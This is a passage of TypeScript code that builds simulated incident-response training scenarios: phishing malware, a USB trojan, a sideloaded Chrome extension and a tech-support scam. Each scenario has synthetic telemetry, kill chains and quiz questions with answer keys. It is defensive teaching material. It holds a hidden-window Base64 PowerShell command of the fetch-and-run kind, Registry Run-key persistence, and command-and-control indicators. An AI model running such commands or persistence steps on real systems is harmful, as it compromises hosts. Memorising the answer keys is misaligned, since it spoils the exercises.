      id: "evt_pm_01_email", ts: T(0),
      source: "o365", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
      user_email: victim.email, src_ip: "45.148.10.77",
      severity: "medium", mitre_technique: "T1566.001",
      description: "r.avraham received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender impersonating a shipping company. SPF and DKIM both failed.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "notifications@shiptrack-express.info",
        "email.to.address": victim.email,
        "email.subject": "Your Package Could Not Be Delivered — Action Required",
        "email.attachment.name": "Delivery_Notice_48213.zip",
        "email.direction": "inbound",
        "file.size": "18422",
        "source.ip": "45.148.10.77",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "action_result": "delivered",
        "threat.category": "Phishing",
      },
    },
    {
      id: "evt_pm_02_execute", ts: T(6 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "r.avraham extracted the ZIP and ran Delivery_Notice_48213.pdf.exe from the Downloads folder on WS-HR-1182; explorer.exe was the parent process.",
      process: {
        name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
        user: "NEXACORP\\r.avraham", integrity: "medium",
        hash: { sha256: fileHash },
      },
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1:2234567890",
        "crowdstrike.detection.description": "Unsigned executable with double file extension (.pdf.exe) launched directly by explorer.exe from the user's Downloads folder.",
        "crowdstrike.detection.scenario": "suspicious_double_extension_execution",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "Double file extension detected (.pdf.exe)|Unsigned binary|Launched from Downloads folder|No legitimate parent application",
        "crowdstrike.sensor.id": "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "process_created",
        "process.pid": "6624",
        "process.executable": "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe",
        "process.name": "Delivery_Notice_48213.pdf.exe",
        "process.command_line": "\"C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
        "process.hash.sha256": fileHash,
        "process.signed": "false",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\r.avraham",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },
    {
      id: "evt_pm_03_beacon", ts: T(6 * MIN + 45_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 4608, bytes_in: 51200, domain: c2Domain },
      description: "WS-HR-1182 opened an outbound HTTPS session to shiptrack-updates-net.xyz, a domain registered 2 days ago; the firewall allowed the session.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "51204",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "network.bytes_out": "4608", "network.bytes_in": "51200",
        "dns.query_domain": c2Domain,
        "domain.registration_age_days": "2",
        "action_result": "allow",
      },
    },
    {
      id: "evt_pm_04_detect", ts: T(9 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1204.002",
      file: { path: "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe", sha256: fileHash, size: 391168 },
      description: "CrowdStrike Falcon quarantined Delivery_Notice_48213.pdf.exe on WS-HR-1182, matching a known commodity trojan signature (family: Glupteba-variant).",
      raw: {
        "crowdstrike.event_simplename": "DetectionSummaryEvent",
        "crowdstrike.detection.id": "ldt:d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1:2234567891",
        "crowdstrike.detection.description": "Known trojan signature match — file and its parent process were quarantined and killed.",
        "crowdstrike.detection.scenario": "known_malware_family",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition": "128",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.threat.name": "Trojan.Glupteba-variant",
        "crowdstrike.behaviors": "Known malware hash match|Process terminated|File quarantined",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "registered-2-days-ago"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "sha256", value: fileHash, reputation: "malicious", tags: ["commodity-trojan", "double-extension"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Phishing Attachment → Malware Execution → Workstation Compromise",
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "phishing_malware_basic",
    briefing: "CrowdStrike Falcon raised a critical detection on WS-HR-1182 (r.avraham) at 10:33 and quarantined a file. The mail gateway also logged an inbound attachment to the same user earlier this morning. Confirm what ran on the host.",
    narrative: `r.avraham received a phishing email disguised as a shipping notification, with a ZIP attachment hiding a trojan behind a double file extension (.pdf.exe). Minutes after opening it, the malware called out to a freshly-registered command-and-control domain and was later caught and quarantined by the EDR — but not before it had already run on the workstation.`,
    learning_objectives: [
      "Recognize a phishing email with a disguised executable attachment (T1566.001)",
      "Identify user execution of a double-extension file as the actual infection point (T1204.002)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe — young domains are a strong indicator",
      "See how EDR detection can lag behind execution — the workstation is compromised the moment the process runs, not when it's caught",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),               phase: "Initial Access",  action: "Phishing email with ZIP attachment delivered to r.avraham" },
      { ts: T(6 * MIN),         phase: "Execution",       action: "r.avraham double-clicks the disguised .pdf.exe — malware runs" },
      { ts: T(6 * MIN + 45_000), phase: "Command & Control", action: "Malware beacons out to a 2-day-old domain; firewall allows it" },
      { ts: T(9 * MIN),         phase: "Detection",       action: "EDR identifies the known trojan and quarantines it" },
    ],
    questions: [
      { id: "q1", prompt: "What is the single clearest sign that Delivery_Notice_48213.pdf.exe is not really a PDF?", kind: "single",
        options: [
          { value: "size",  label: "The archive is only 18KB, far too small for a real shipping document" },
          { value: "ext",   label: "The real file extension is .exe, hidden behind a fake .pdf in the name" },
          { value: "email", label: "The email arrived from an external sender outside the organization's mail domain" },
          { value: "user",  label: "r.avraham works in HR and has no business reason to receive a shipping notice" },
        ],
        answer: "ext", xp: 40,
        explanation: "A double extension like .pdf.exe is a classic disguise — Windows only looks at the LAST extension (.exe) to decide how to run the file, but a distracted user only sees '.pdf' at a glance. The file size and sender being external are supporting context, not the direct proof." },
      { id: "q2", prompt: "The firewall ALLOWED the connection to shiptrack-updates-net.xyz. Does that mean the connection was safe?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the firewall returned action=allow, which means the destination passed its threat and URL filtering checks" },
          { value: "no",  label: "No — 'allowed' just means it wasn't on a blocklist yet; a domain registered 2 days ago is itself suspicious" },
        ],
        answer: "no", xp: 50,
        explanation: "Firewalls default to allow unless a domain is already known-bad. A domain registered only 2 days ago is a strong red flag on its own — legitimate business services are almost never that young. 'Allowed by the firewall' and 'safe' are not the same thing, and a SOC analyst has to evaluate the domain itself, not just the firewall verdict." },
      { id: "q3", prompt: "At what point was WS-HR-1182 actually compromised?", kind: "single",
        options: [
          { value: "email",   label: "When the phishing email arrived in the inbox" },
          { value: "execute", label: "When r.avraham double-clicked the .pdf.exe and it ran" },
          { value: "detect",  label: "When CrowdStrike quarantined the file" },
        ],
        answer: "execute", xp: 60,
        explanation: "Compromise happens at execution, not at delivery or at detection. The email sitting unopened in an inbox is not a compromise. The quarantine at the end is the response catching up to an infection that already happened minutes earlier — this is why 'the antivirus caught it eventually' is not the same as 'nothing bad happened.'" },
    ],
  };
}

// =========================================================================
// Foundation Scenario B: Malicious USB Drive → Trojan Persistence → Workstation Compromise
// Second beginner-tier scenario — different infection vector (physical media
// instead of email) so a student's first few sessions aren't all identical.
// Still one host, one user, EDR-only telemetry, no lateral movement.
// =========================================================================

export function buildUsbMalwareScenario(scenarioId = "usb-malware-basic-2026"): ScenarioBundle {
  const B = new Date("2026-05-22T13:30:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-OPS-2214", email: "m.levi@nexacorp.com", ip: "10.10.55.19" };
  const fileHash = makeSha256("usb_backup_tool_exe_trojan_dropper");

  const events: TelemetryEvent[] = [
    {
      id: "evt_usb_01_copy", ts: T(0),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "low",
      file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
      description: "USB_Backup_Tool.exe was copied from a removable USB drive (E:\\) to the Desktop on WS-OPS-2214.",
      raw: {
        "crowdstrike.event_simplename": "NewExecutableWritten",
        "event.action": "file_written",
        "file.path": "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        "file.source_volume": "E:\\",
        "file.source_volume_type": "removable",
        "file.hash.sha256": fileHash,
        "file.signed": "false",
        "device.removable_media.serial": "07A3F9C1",
        "device.removable_media.asset_tagged": "false",
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_02_execute", ts: T(3 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1204.002",
      description: "m.levi ran USB_Backup_Tool.exe on WS-OPS-2214 with explorer.exe as the parent process; the binary is unsigned.",
      process: {
        name: "USB_Backup_Tool.exe", pid: 7712, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe\"",
        user: "NEXACORP\\m.levi", integrity: "medium",
        hash: { sha256: fileHash },
      },
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2:3234567890",
        "crowdstrike.detection.description": "Unsigned executable, first seen globally, launched directly by explorer.exe from a file recently copied off removable media.",
        "crowdstrike.detection.scenario": "suspicious_removable_media_execution",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "Unsigned binary|First seen globally|Originated from removable media|No legitimate parent application",
        "process.pid": "7712",
        "process.executable": "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        "process.name": "USB_Backup_Tool.exe",
        "process.hash.sha256": fileHash,
        "process.signed": "false",
        "process.parent.name": "explorer.exe",
        "user.name": "NEXACORP\\m.levi",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_usb_03_persist", ts: T(3 * MIN + 20_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "registry_set",
      hostname: victim.hostname, user_email: victim.email,
      severity: "high", mitre_technique: "T1547.001",
      description: "USB_Backup_Tool.exe wrote a Registry Run key on WS-OPS-2214 that relaunches it at every m.levi logon.",
      raw: {
        "crowdstrike.event_simplename": "RegistryOperationDetectInfo",
        "crowdstrike.detection.description": "Registry Run key created pointing to a binary that was executed directly from removable media minutes earlier. Consistent with autostart persistence.",
        "crowdstrike.detection.scenario": "registry_persistence_removable_media",
        "crowdstrike.detection.technique": "Boot or Logon Autostart Execution: Registry Run Keys",
        "crowdstrike.detection.technique_id": "T1547.001",
        "event.action": "registry_value_set",
        "registry.path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemBackupSvc",
        "registry.key": "SystemBackupSvc",
        "registry.value": "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe",
        "process.name": "USB_Backup_Tool.exe",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "user.name": "NEXACORP\\m.levi",
      },
    },
    {
      id: "evt_usb_04_detect", ts: T(5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1547.001",
      file: { path: "C:\\Users\\m.levi\\Desktop\\USB_Backup_Tool.exe", sha256: fileHash, size: 245760 },
      description: "CrowdStrike Falcon quarantined USB_Backup_Tool.exe on WS-OPS-2214 as a known trojan dropper and removed its Registry Run key.",
      raw: {
        "crowdstrike.event_simplename": "DetectionSummaryEvent",
        "crowdstrike.detection.description": "Known trojan-dropper signature match — file quarantined, malicious process killed, persistence artifact removed.",
        "crowdstrike.detection.scenario": "known_malware_family",
        "crowdstrike.detection.technique": "Boot or Logon Autostart Execution: Registry Run Keys",
        "crowdstrike.detection.technique_id": "T1547.001",
        "crowdstrike.detection.pattern_disposition": "128",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File, Remove Persistence",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.threat.name": "Trojan.GenericDropper",
        "process.hash.sha256": fileHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "sha256", value: fileHash, reputation: "malicious", tags: ["trojan-dropper", "removable-media"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Malicious USB Drive → Trojan Persistence → Workstation Compromise",
    threat_actor: "Commodity Malware / Opportunistic Physical Access",
    attack_kind: "usb_malware_basic",
    briefing: "CrowdStrike Falcon raised a critical detection on WS-OPS-2214 at 13:50 and quarantined a file. Removable-media activity was logged on the same workstation shortly beforehand. The assigned user, m.levi, has not reported anything.",
    narrative: `An untagged USB drive was plugged into WS-OPS-2214 and a file was copied to the Desktop. m.levi ran it, believing it to be a legitimate backup tool. The binary set up a Registry Run key to survive reboots and was later caught and quarantined by the EDR — but only after it had already gained a foothold on the workstation.`,
    learning_objectives: [
      "Recognize removable media as an infection vector, separate from email or the network",
      "Identify user execution of an unsigned, never-before-seen binary (T1204.002)",
      "Understand Registry Run key persistence as a beginner-level but very common technique (T1547.001)",
      "See that 'quarantined' does not mean 'nothing happened' — persistence was already established",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),                phase: "Initial Access", action: "Untagged USB drive used to copy USB_Backup_Tool.exe onto WS-OPS-2214" },
      { ts: T(3 * MIN),          phase: "Execution",      action: "m.levi double-clicks the unsigned binary — malware runs" },
      { ts: T(3 * MIN + 20_000), phase: "Persistence",    action: "Malware writes a Registry Run key to survive reboot" },
      { ts: T(5 * MIN),          phase: "Detection",      action: "EDR identifies the trojan dropper and quarantines it" },
    ],
    questions: [
      { id: "q1", prompt: "What made this USB drive suspicious even before anything was executed?", kind: "single",
        options: [
          { value: "tag",  label: "It had no company asset tag and had never been seen on this host before" },
          { value: "size", label: "The copied file was only 340KB — far smaller than a genuine backup utility installer" },
          { value: "user", label: "m.levi works in Operations and has no documented business need for a backup tool" },
        ],
        answer: "tag", xp: 40,
        explanation: "An unrecognized, untagged removable drive is itself a red flag in any environment with asset management — company-issued drives are known and tracked. File size and the user's department are not reliable indicators on their own." },
      { id: "q2", prompt: "Which single event in this chain represents the malware becoming PERSISTENT (surviving a reboot)?", kind: "single",
        options: [
          { value: "copy",    label: "evt_usb_01_copy — the file being copied from the USB drive" },
          { value: "execute", label: "evt_usb_02_execute — the user double-clicking the file" },
          { value: "persist", label: "evt_usb_03_persist — the Registry Run key being written" },
        ],
        answer: "persist", xp: 50,
        explanation: "Copying and even running the file are one-time events — if the machine reboots before either happens again, the malware is gone. The Registry Run key is what makes the infection survive a reboot, which is the technical definition of persistence (T1547.001)." },
      { id: "q3", prompt: "The EDR shows 'action_result: quarantined' with a Critical severity. Is the incident fully resolved at that point?", kind: "single",
        options: [
          { value: "yes", label: "Yes — the EDR quarantined the binary before it could execute, so the threat is neutralized and no post-execution cleanup is required" },
          { value: "no",  label: "No — the malware ran and achieved persistence before being caught; the analyst still needs to confirm no other changes were made and document the incident" },
        ],
        answer: "no", xp: 60,
        explanation: "Quarantine stops the immediate threat, but it doesn't undo everything the malware did while it was running. A SOC analyst still needs to check for any other artifacts, confirm the Registry key was actually removed, and write up the incident — 'quarantined' is the start of cleanup, not the end of the investigation." },
    ],
  };
}

// =========================================================================
// Foundation Scenario C: Sideloaded Browser Extension → PowerShell Spawned by Chrome
// Third beginner-tier scenario — infection vector is a developer-mode browser
// extension, not email or physical media. Still one host, one user, EDR (+
// one firewall event for the outbound reach-out), no lateral movement.
// =========================================================================

export function buildBrowserExtensionMalwareScenario(scenarioId = "browser-extension-malware-2026"): ScenarioBundle {
  const B = new Date("2026-05-25T09:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-MKT-3301", email: "d.cohen@nexacorp.com", ip: "10.10.62.18" };
  const c2Domain = "cdn-assets-update.xyz";
  const c2Ip = "185.220.101.77";
  const stagerHash = makeSha256("browser_ext_stage2_payload");

  const events: TelemetryEvent[] = [
    {
      id: "evt_bext_01_sideload", ts: T(0),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "low", mitre_technique: "T1176",
      description: "Chrome relaunched on WS-MKT-3301 with a --load-extension flag pointing to an unpacked folder in d.cohen's Downloads directory.",
      process: {
        name: "chrome.exe", pid: 8814, parent_name: "explorer.exe", parent_pid: 3140,
        cmdline: "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3:4234567890",
        "crowdstrike.detection.description": "Browser process launched with a --load-extension argument referencing a folder outside the standard Chrome Web Store extension install path.",
        "crowdstrike.detection.scenario": "unsigned_browser_extension_sideload",
        "crowdstrike.detection.tactic": "Persistence",
        "crowdstrike.detection.tactic_id": "TA0003",
        "crowdstrike.detection.technique": "Browser Extensions",
        "crowdstrike.detection.technique_id": "T1176",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.severity": "Low",
        "crowdstrike.behaviors": "Developer-mode extension load flag|Extension folder outside Web Store cache path|Folder located in user Downloads",
        "crowdstrike.sensor.id": "c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6",
        "event.action": "process_created",
        "process.pid": "8814",
        "process.executable": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "process.command_line": "--load-extension=\"C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\"",
        "process.parent.name": "explorer.exe",
        "process.parent.pid": "3140",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
        "host.ip": victim.ip,
      },
    },
    {
      id: "evt_bext_02_powershell", ts: T(2 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1059.001",
      description: "chrome.exe on WS-MKT-3301 spawned powershell.exe directly, with a hidden window and a Base64-encoded command.",
      process: {
        name: "powershell.exe", pid: 9021, parent_name: "chrome.exe", parent_pid: 8814,
        cmdline: "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        user: "NEXACORP\\d.cohen", integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simplename": "ProcessRollup2",
        "crowdstrike.detection.id": "ldt:f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3:4234567891",
        "crowdstrike.detection.description": "powershell.exe launched as a direct child of chrome.exe with a hidden window style and an encoded command argument.",
        "crowdstrike.detection.scenario": "browser_spawned_scripting_interpreter",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.behaviors": "Parent process is a web browser|Hidden window style|Base64-encoded command argument|Unusual parent-child relationship",
        "process.pid": "9021",
        "process.executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process.command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "process.parent.name": "chrome.exe",
        "process.parent.pid": "8814",
        "user.name": "NEXACORP\\d.cohen",
        "host.name": victim.hostname,
      },
    },
    {
      id: "evt_bext_03_beacon", ts: T(2 * MIN + 30_000),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: victim.hostname, user_email: victim.email,
      src_ip: victim.ip, dst_ip: c2Ip, dst_port: 443, protocol: "tcp",
      severity: "high", mitre_technique: "T1071.001",
      network: { bytes_out: 3072, bytes_in: 40960, domain: c2Domain },
      description: "WS-MKT-3301 opened an outbound HTTPS connection to cdn-assets-update.xyz, a domain registered 4 days ago; the firewall allowed the session.",
      raw: {
        "event.action": "network-connection-allowed", "event.outcome": "success",
        "source.ip": victim.ip, "source.port": "53718",
        "destination.ip": c2Ip, "destination.port": "443",
        "network.protocol": "tcp", "network.transport": "tcp",
        "network.application": "ssl",
        "pan.app": "ssl", "pan.action": "allow", "pan.rule": "ALLOW-OUTBOUND-HTTPS",
        "network.bytes_out": "3072", "network.bytes_in": "40960",
        "dns.query_domain": c2Domain,
        "domain.registration_age_days": "4",
        "action_result": "allow",
      },
    },
    {
      id: "evt_bext_04_detect", ts: T(4 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "av_quarantine",
      hostname: victim.hostname, user_email: victim.email,
      severity: "critical", mitre_technique: "T1059.001",
      file: { path: "C:\\Users\\d.cohen\\Downloads\\perf_boost_ext_unpacked\\background.js", sha256: stagerHash, size: 18944 },
      description: "CrowdStrike Falcon killed the encoded PowerShell process and quarantined the sideloaded extension folder on WS-MKT-3301, matching a known loader (family: ScriptBridge-variant).",
      raw: {
        "crowdstrike.event_simplename": "DetectionSummaryEvent",
        "crowdstrike.detection.id": "ldt:f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3:4234567892",
        "crowdstrike.detection.description": "Known malicious loader signature match on the sideloaded extension payload — process killed and extension folder quarantined.",
        "crowdstrike.detection.scenario": "known_malware_family",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
        "crowdstrike.detection.technique_id": "T1059.001",
        "crowdstrike.detection.pattern_disposition": "128",
        "crowdstrike.detection.pattern_disposition_description": "Prevention, Kill Process, Quarantine File",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.threat.name": "Trojan.ScriptBridge-variant",
        "crowdstrike.behaviors": "Known malicious loader hash match|Process terminated|Extension folder quarantined",
        "process.hash.sha256": stagerHash,
        "host.name": victim.hostname,
        "action_result": "quarantined",
      },
    },
  ];

  const iocs: IOC[] = [
    { type: "domain", value: c2Domain, reputation: "malicious", tags: ["external-infrastructure", "registered-4-days-ago"] },
    { type: "ip",     value: c2Ip,     reputation: "malicious", tags: ["external-infrastructure"] },
    { type: "sha256", value: stagerHash, reputation: "malicious", tags: ["browser-extension-loader"] },
  ];

  return {
    scenario_id: scenarioId,
    title: "Sideloaded Browser Extension → PowerShell Spawned by Chrome",
    threat_actor: "Commodity Malware Operator (opportunistic, financially motivated)",
    attack_kind: "browser_extension_malware_basic",
    briefing: "CrowdStrike Falcon raised a critical detection on WS-MKT-3301 (d.cohen) at 09:12 and quarantined a folder under the user's profile. The firewall logged an outbound connection from the same host to an unfamiliar domain minutes earlier.",
    narrative: "d.cohen installed a browser extension promising to speed up Chrome, loaded through a developer-mode flag rather than the Chrome Web Store. Within minutes, chrome.exe spawned an encoded PowerShell command that reached out to a freshly-registered domain, and was later caught and quarantined by the EDR — but not before the beacon completed.",
    learning_objectives: [
      "Recognize a sideloaded browser extension as a persistence mechanism (T1176), separate from email or removable media",
      "Identify a browser process spawning a scripting interpreter as a clear parent-child anomaly (T1059.001)",
      "Understand that a firewall ALLOW on a brand-new domain is not the same as safe",
      "See how EDR detection can lag behind execution — the beacon already completed before quarantine",
    ],
    events,
    iocs,
    alerts: eventsToAlerts(events, scenarioId),
    killchain: [
      { ts: T(0),               phase: "Persistence",      action: "Chrome relaunched with a sideloaded extension from Downloads" },
      { ts: T(2 * MIN),         phase: "Execution",         action: "chrome.exe spawns encoded PowerShell — malware runs" },
      { ts: T(2 * MIN + 30_000), phase: "Command & Control", action: "PowerShell beacons out to a 4-day-old domain; firewall allows it" },
      { ts: T(4 * MIN),         phase: "Detection",          action: "EDR identifies the loader and quarantines it" },
    ],
    questions: [
      { id: "q1", prompt: "What is the clearest sign that this browser extension was not installed normally?", kind: "single",
        options: [
          { value: "flag",  label: "Chrome was launched with a --load-extension flag pointing to a folder in Downloads" },
          { value: "size",  label: "The extension folder was small" },
          { value: "dept",  label: "d.cohen works in marketing, not IT" },
        ],
        answer: "flag", xp: 40,
        explanation: "The --load-extension command-line flag is a developer-mode mechanism for loading unpacked extensions directly from disk — it bypasses the Chrome Web Store entirely, which is the normal install path for every legitimate extension. Folder size and the user's department are not reliable indicators on their own." },
      { id: "q2", prompt: "Why is chrome.exe spawning powershell.exe significant, even before anything else is known?", kind: "single",
        options: [
          { value: "yes", label: "A web browser process is never the legitimate parent of a scripting interpreter — this parent-child pairing is itself abnormal" },
          { value: "no",  label: "It is not significant — browsers routinely launch PowerShell for updates" },
        ],
        answer: "yes", xp: 50,
        explanation: "Browsers do not legitimately spawn command-line interpreters as child processes. Any time a process tree shows a browser as the parent of powershell.exe, cmd.exe, or similar, that parent-child relationship alone is a strong anomaly worth investigating, independent of what the PowerShell command actually does." },
      { id: "q3", prompt: "The firewall ALLOWED the connection to cdn-assets-update.xyz. Does that mean the connection was safe?", kind: "single",
        options: [
          { value: "yes", label: "Yes — if the firewall allowed it, it passed a security check" },
          { value: "no",  label: "No — 'allowed' just means it wasn't on a blocklist yet; a domain registered 4 days ago is itself suspicious" },
        ],
        answer: "no", xp: 50,
        explanation: "Firewalls default to allow unless a domain is already known-bad. A domain registered only days ago is a strong red flag on its own, since legitimate business services are almost never that young. 'Allowed by the firewall' and 'safe' are not the same thing." },
    ],
  };
}

// =========================================================================
// Foundation Scenario D: Tech-Support Scam → Unapproved Remote Access Tool
// Fourth beginner-tier scenario — the user is socially engineered over the
// phone into installing a legitimate, signed remote-access tool themselves.
// One host, one user, EDR-only telemetry, no lateral movement, no
// credential theft — the "malware" here is abuse of a trusted tool.
// =========================================================================

export function buildTechSupportScamScenario(scenarioId = "tech-support-scam-2026"): ScenarioBundle {
  const B = new Date("2026-05-27T14:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const victim = { hostname: "WS-ACC-4477", email: "t.mizrahi@nexacorp.com", ip: "10.10.71.29" };
  const toolHash = makeSha256("anydesk_portable_binary_legit_signed");

  const events: TelemetryEvent[] = [
    {
      id: "evt_rat_01_download", ts: T(0),
      source: "edr", vendor: "SentinelOne", event_type: "file_create",
      hostname: victim.hostname, user_email: victim.email,
      severity: "low",
      file: { path: "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe", sha256: toolHash, size: 4192256 },
      description: "AnyDesk.exe, a signed remote-access tool with no prior install history on this host, was downloaded to t.mizrahi's Downloads folder on WS-ACC-4477.",
      raw: {
        "s1.event_type": "FILE_CREATION",
        "s1.threat_level": "none",
        "s1.detection.classification": "PUA",
        "s1.detection.classification_source": "Engine",
        "s1.site.name": "Corp-Main",
        "s1.group.name": "Workstations",
        "file.path": "C:\\Users\\t.mizrahi\\Downloads\\AnyDesk.exe",
        "file.hash.sha256": toolHash,
